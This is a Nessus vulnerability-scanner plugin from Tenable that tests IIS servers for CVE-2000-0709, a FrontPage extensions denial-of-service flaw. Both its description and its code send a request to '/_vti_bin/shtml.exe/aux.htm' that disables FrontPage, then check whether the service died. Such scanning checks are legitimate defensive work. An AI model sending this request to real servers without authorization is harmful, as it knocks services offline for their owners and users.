#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10497);
 script_version("$Revision: 1.33 $");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");

 script_cve_id("CVE-2000-0709");
 script_bugtraq_id(1608);
 script_osvdb_id(396);

 script_name(english:"Microsoft FrontPage Extensions MS-DOS Device Request DoS");
 script_summary(english:"Disables Microsoft Frontpage extensions");

 script_set_attribute(attribute:"synopsis", value:"The web server has a denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"It is possible to disable FrontPage extensions on the remote host by
requesting a URL containing the name of a DOS device via shtml.exe,
such as :

 GET /_vti_bin/shtml.exe/aux.htm

An attacker could use this flaw to disable FrontPage.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Aug/340");
 script_set_attribute(attribute:"see_also", value:"http://msdn.microsoft.com/workshop/languages/fp/2000/winfpse.asp");
 script_set_attribute(attribute:"solution", value:"Upgrade to FrontPage 1.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/08/17");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/08/24");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"Web Servers");

 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_keys("Settings/ParanoidReport", "www/iis");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);
if (http_is_dead(port: port)) exit(1, "The web server on port "+port+" is already dead.");

sig = get_http_banner(port: port, exit_on_fail: 1);
if (! egrep(string: sig, pattern: "^Server:.*Microsoft-IIS"))
 exit(0, "The web server on port "+port+" is not IIS.");

r1 = http_send_recv3(method:"GET", item:"/_vti_bin/shtml.exe", port:port, exit_on_fail: 1);

if (ereg(pattern:"HTTP/[0-9]\.[0-9] 200 .*", string: r1[0]))
 {
   r2 = http_send_recv3(
     method:"GET",
     item:"/_vti_bin/shtml.exe/aux.htm",
     port:port
   );
   r3 = http_send_recv3(method:"GET", item:"/_vti_bin/shtml.exe", port:port, exit_on_fail: 0);

   if (isnull(r3)) security_warning(port);
 }

